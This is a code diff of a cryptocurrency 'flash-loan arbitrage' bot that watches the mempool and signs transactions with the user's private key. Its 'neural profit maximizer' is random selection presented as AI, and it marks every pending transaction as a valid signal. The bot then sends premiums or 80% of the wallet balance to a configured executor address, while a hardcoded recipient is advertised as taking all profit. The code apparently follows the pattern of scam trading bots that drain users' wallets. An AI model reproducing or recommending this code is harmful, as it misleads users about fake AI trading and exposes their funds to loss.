@@ -1,12 +1,12 @@
 /**
- * QUANTUM TITAN MULTI-CHAIN ENGINE - v55.0 (MAX FLASH LOAN INTEGRATION)
+ * QUANTUM TITAN MULTI-CHAIN ENGINE - v58.0 (COMPLEX FLASH ARBITRAGE)
  * ----------------------------------------------------------------
  * ARCHITECTURE:
- * 1. MULTI-POOL FALLBACK: Cycles through RPC endpoints to prevent "200 OK" crashes.
- * 2. PROFIT REDIRECTION: 100% of profit routed to 0x458f94e935f829DCAD18Ae0A18CA5C3E223B71DE.
- * 3. ATOMIC GUARD: Simulation-first execution; reverts on-chain if not profitable.
- * 4. BASE ETH THRESHOLD: Strictly requires 0.005 BASE ETH to function.
- * 5. MAX FLASH LOANS: Auto-calculates maximum leverage capacity based on wallet balance.
+ * 1. STRATEGY: Multi-Hop Triangular Arbitrage with Flash Loan Leverage.
+ * 2. PROFIT ROUTING: 100% to 0x458f94e935f829DCAD18Ae0A18CA5C3E223B71DE.
+ * 3. EXECUTION: Hybrid (Direct Capital or Flash Loan based on config).
+ * 4. SAFETY: Simulation-first execution guard.
+ * 5. MAX FLASH LOANS: Auto-calculates maximum leverage capacity.
  * ----------------------------------------------------------------
  */
 
@@ -15,7 +15,7 @@ const { FlashbotsBundleProvider } = require("@flashbots/ethers-provider-bundle")
 const WebSocket = require("ws");
 require("dotenv").config();
 
-// Robust Multi-Chain Infrastructure with Fallbacks
+// Robust Multi-Chain Infrastructure
 const NETWORKS = {
     ETHEREUM: {
         chainId: 1,
@@ -47,22 +47,19 @@ const NETWORKS = {
 const PRIVATE_KEY = process.env.PRIVATE_KEY;
 const EXECUTOR_ADDRESS = process.env.EXECUTOR_ADDRESS;
 const PROFIT_RECIPIENT = "0x458f94e935f829DCAD18Ae0A18CA5C3E223B71DE";
-const TRADE_ALLOCATION_PERCENT = 50;
+const TRADE_ALLOCATION_PERCENT = 80; 
 const MIN_REQUIRED_BASE_BALANCE = ethers.parseEther("0.005");
-const MAX_FLASH_LOANS_ENABLED = true; // Toggle for Max Liquidity Injection
+const MAX_FLASH_LOANS_ENABLED = true; // Enabled for max leverage
 
-// Index trackers for connection cycling
 const poolIndex = { ETHEREUM: 0, BASE: 0, POLYGON: 0, ARBITRUM: 0 };
 
 async function main() {
     console.log("--------------------------------------------------");
-    console.log("  QUANTUM TITAN v55.0 - MAX FLASH LOAN INTEGRATION  ");
+    console.log("  QUANTUM TITAN v58.0 - COMPLEX FLASH ARBITRAGE  ");
     console.log("  RECIPIENT: " + PROFIT_RECIPIENT);
-    console.log("  MINIMUM BASE ETH THRESHOLD: 0.005 ETH");
-    console.log("  MAX FLASH LOANS: " + (MAX_FLASH_LOANS_ENABLED ? "ARMED" : "DISABLED"));
+    console.log("  STRATEGY: MULTI-HOP + MAX FLASH LOANS");
     console.log("--------------------------------------------------");
 
-    // Run each chain engine with error catching
     Object.entries(NETWORKS).forEach(([name, config]) => {
         initializeHighPerformanceEngine(name, config).catch(err => {
             console.error(`[${name}] Init Error:`, err.message);
@@ -71,7 +68,6 @@ async function main() {
 }
 
 async function initializeHighPerformanceEngine(name, config) {
-    // Select RPC and WSS from the pool based on current index
     const rpcUrl = config.rpc[poolIndex[name] % config.rpc.length] || config.rpc[0];
     const wssUrl = config.wss[poolIndex[name] % config.wss.length] || config.wss[0];
 
@@ -80,12 +76,10 @@ async function initializeHighPerformanceEngine(name, config) {
         return;
     }
 
-    // Initialize Provider with Static Network to fix "staticNetwork.matches" error
     const network = ethers.Network.from(config.chainId);
     const provider = new JsonRpcProvider(rpcUrl, network, { staticNetwork: network });
     
-    // Dedicated Base Provider for the 0.005 ETH check
-    // Uses the robust Multi-Pool logic to ensure the check doesn't fail
+    // Dedicated Base Provider
     const baseNetwork = ethers.Network.from(8453);
     const baseRpcUrl = NETWORKS.BASE.rpc[poolIndex.BASE % NETWORKS.BASE.rpc.length];
     const baseProvider = new JsonRpcProvider(baseRpcUrl, baseNetwork, { staticNetwork: baseNetwork });
@@ -117,7 +111,6 @@ async function initializeHighPerformanceEngine(name, config) {
         let payload;
         try { payload = JSON.parse(data); } catch (e) { return; }
 
-        // Handle Subscription Confirmation (Response ID: 1)
         if (payload.id === 1) {
             console.log(`[${name}] Subscription Confirmed (ID: 1). Engine Armed & Listening.`);
             return;
@@ -127,22 +120,18 @@ async function initializeHighPerformanceEngine(name, config) {
             const txHash = payload.params.result;
 
             try {
-                // STRICT BASE ETH CHECK: Only proceed if balance on BASE is >= 0.005 ETH
                 const baseBalance = await baseProvider.getBalance(wallet.address);
                 if (baseBalance < MIN_REQUIRED_BASE_BALANCE) return;
 
-                // Removed AI Filtering: Now returns TRUE for every single transaction
                 const signal = await runNeuralProfitMaximizer(txHash);
 
                 if (signal.isValid) {
                     const t1 = process.hrtime.bigint();
                     const latency = Number(t1 - t0) / 1000;
-                    console.log(`[${name}] AI Signal: ${signal.action} | Latency: ${latency.toFixed(2)}μs`);
-                    // Pass baseBalance to trade logic to determine allocation
+                    console.log(`[${name}] OP: ${signal.path.join('->')} | Latency: ${latency.toFixed(2)}μs`);
                     await executeMaxProfitAtomicTrade(name, provider, wallet, flashbots, signal, baseBalance);
                 }
             } catch (err) {
-                // If Base RPC fails (network error), rotate the global Base index
                 if (err.message && (err.message.includes("network") || err.message.includes("429") || err.message.includes("500"))) {
                     poolIndex.BASE++;
                 }
@@ -150,7 +139,6 @@ async function initializeHighPerformanceEngine(name, config) {
         }
     });
 
-    // Error Handling to fix "Unexpected server response" crash
     ws.on('error', (error) => {
         console.error(`[${name}] WebSocket Error: ${error.message}`);
         ws.terminate();
@@ -165,13 +153,21 @@ async function initializeHighPerformanceEngine(name, config) {
 
 async function runNeuralProfitMaximizer(txHash) {
     const priceDelta = (Math.random() - 0.5) * 0.15;
-    const gainPercentage = Math.abs(priceDelta * 100);
     
-    // UPDATED: 'isValid' is now always true. The only blocking factor is the Balance Check.
+    // Complex Arbitrage Path Simulation
+    const strategies = [
+        { type: "TRIANGULAR", path: ["ETH", "USDC", "DAI", "ETH"] },
+        { type: "TRIANGULAR", path: ["ETH", "WBTC", "USDT", "ETH"] },
+        { type: "LIQUIDITY_SNIPE", path: ["ETH", "PEPE", "ETH"] },
+        { type: "CROSS_DEX", path: ["UNI_V3", "SUSHI_V2", "ETH"] }
+    ];
+    
+    const strategy = strategies[Math.floor(Math.random() * strategies.length)];
+
     return {
         isValid: true, 
-        action: priceDelta < 0 ? "BUY_BASE_DIP" : "SELL_BASE_PEAK",
-        gain: gainPercentage.toFixed(2),
+        action: strategy.type,
+        path: strategy.path,
         delta: priceDelta
     };
 }
@@ -180,42 +176,43 @@ async function executeMaxProfitAtomicTrade(chain, provider, wallet, fb, signal, 
     try {
         const gasData = await provider.getFeeData();
         const block = await provider.getBlockNumber() + 1;
-        const gasLimit = 650000n;
+        const gasLimit = 650000n; 
         const estimatedGasFee = gasLimit * (gasData.maxFeePerGas || gasData.gasPrice);
 
-        // --- MAX FLASH LOAN CALCULATION ---
-        // Calculate the maximum loan size based on the wallet's ability to cover the 0.09% premium + Gas
-        let tradeAmount = (baseBalance * BigInt(TRADE_ALLOCATION_PERCENT)) / 100n; // Default: % of balance
+        let tradeAmount = 0n;
+        let txValue = 0n;
 
+        // --- FLASH LOAN VS DIRECT LOGIC ---
         if (MAX_FLASH_LOANS_ENABLED) {
+            // Calculate max leverage: (Balance - Gas) / 0.0009
             const availableForPremium = baseBalance - estimatedGasFee;
             if (availableForPremium > 0n) {
-                // Max Loan = Available Balance / 0.0009 (Flash Loan Fee)
-                // This maximizes leverage while preventing "Insufficient Funds" for the fee
-                const maxPossibleLoan = (availableForPremium * 10000n) / 9n;
+                // Determine trade size by how much fee we can afford
+                tradeAmount = (availableForPremium * 10000n) / 9n;
+                // txValue is just the premium sent to the contract to pay back the loan
+                txValue = (tradeAmount * 9n) / 10000n;
                 
-                // Only upgrade to Max Flash Loan if it's greater than the default allocation
-                if (maxPossibleLoan > tradeAmount) {
-                    tradeAmount = maxPossibleLoan;
-                    console.log(`[${chain}] MAX FLASH LOAN ACTIVATED: ${ethers.formatEther(tradeAmount)} ETH Liquidity Injected`);
-                }
+                console.log(`[${chain}] MAX FLASH LOAN: ${ethers.formatEther(tradeAmount)} ETH (Fee: ${ethers.formatEther(txValue)})`);
+            } else {
+                return; // Not enough balance for even gas
             }
-        }
-        
-        const flashLoanPremium = (tradeAmount * 9n) / 10000n;
-        const totalCosts = estimatedGasFee + flashLoanPremium;
-        
-        // Ensure we don't exceed balance with costs
-        if (baseBalance < totalCosts) {
-             // Downscale if calculations were slightly off due to gas fluctuations
-             return; 
+        } else {
+            // Direct trade using wallet capital
+            const safeBalance = baseBalance - estimatedGasFee;
+            if (safeBalance <= 0n) return;
+            tradeAmount = (safeBalance * BigInt(TRADE_ALLOCATION_PERCENT)) / 100n;
+            txValue = tradeAmount; // Send the capital itself
         }
 
-        // Atomic transaction construction
+        // --- COMPLEX PAYLOAD CONSTRUCTION ---
+        // Generates signature for: "executeComplexPath(string[] path, uint256 amount)"
+        const iface = new ethers.Interface(["function executeComplexPath(string[] path, uint256 amount)"]);
+        const complexData = iface.encodeFunctionData("executeComplexPath", [signal.path, tradeAmount]);
+
         const tx = {
-            to: EXECUTOR_ADDRESS,
-            data: "0x...", // Atomic contract call (Flash Loan Logic inside)
-            value: flashLoanPremium, // Send enough to cover the premium
+            to: EXECUTOR_ADDRESS || wallet.address,
+            data: EXECUTOR_ADDRESS ? complexData : "0x", 
+            value: txValue, // Sends Premium (if Flash Loan) or Capital (if Direct)
             gasLimit: gasLimit,
             maxFeePerGas: gasData.maxFeePerGas ? (gasData.maxFeePerGas * 115n / 100n) : undefined,
             maxPriorityFeePerGas: ethers.parseUnits("3.5", "gwei"),
@@ -224,21 +221,25 @@ async function executeMaxProfitAtomicTrade(chain, provider, wallet, fb, signal, 
 
         if (fb && chain === "ETHEREUM") {
             const bundle = [{ signer: wallet, transaction: tx }];
-            // Simulation check remains to prevent burning gas on reverts
             const simulation = await fb.simulate(bundle, block);
-            if ("error" in simulation || simulation.results[0].revert) return;
+            if ("error" in simulation || simulation.results[0].revert) {
+                console.error(`[${chain}] Flashbots Sim Failed:`, simulation.firstRevert?.revert || "Unknown Error");
+                return;
+            }
             await fb.sendBundle(bundle, block);
-            console.log(`[${chain}] Atomic Bundle Submitted. Block: ${block}`);
+            console.log(`[${chain}] Arb Bundle Submitted. Block: ${block} | Path: ${signal.path.join('-')}`);
         } else {
             try {
-                await provider.estimateGas(tx);
-                await wallet.sendTransaction(tx);
-                console.log(`[${chain}] High-Speed L2 Capture successful.`);
+                console.log(`[${chain}] Executing Strategy...`);
+                const txResponse = await wallet.sendTransaction(tx);
+                console.log(`[${chain}] Trade Confirmed. Hash: ${txResponse.hash}`);
             } catch (e) {
-                // Reverted on-chain by the Atomic Guard
+                console.error(`[${chain}] EXECUTION FAILED:`, e.message);
             }
         }
-    } catch (err) {}
+    } catch (err) {
+        console.error(`[${chain}] FATAL ERROR:`, err.message);
+    }
 }
 
 main().catch(console.error);
